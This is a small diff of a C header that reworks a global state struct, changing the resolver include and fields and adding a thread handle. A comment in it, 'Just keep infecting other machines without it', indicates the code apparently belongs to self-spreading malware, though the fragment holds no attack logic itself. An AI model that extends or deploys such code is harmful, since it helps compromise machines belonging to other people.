@@ -1,5 +1,6 @@
+#pragma once
 #include "pack.h"
-#include "resolv_worker.h"
+#include "resolv.h"
 
 #include <stdint.h>
 #include <stdbool.h>
@@ -20,8 +21,11 @@ struct prne_global {
 	uint_fast64_t run_cnt;
 	uint8_t boot_id[16];
 	uint8_t instance_id[16];
-	prne_resolv_wkr_ctx_t resolv;
-	int caught_signal;
+	pth_t main_pth;
+	/*
+	* Could be NULL. Just keep infecting other machines without it.
+	*/
+	prne_resolv_t *resolv;
 	pid_t parent_pid;
 	pid_t child_pid;
 	int lock_shm_fd;
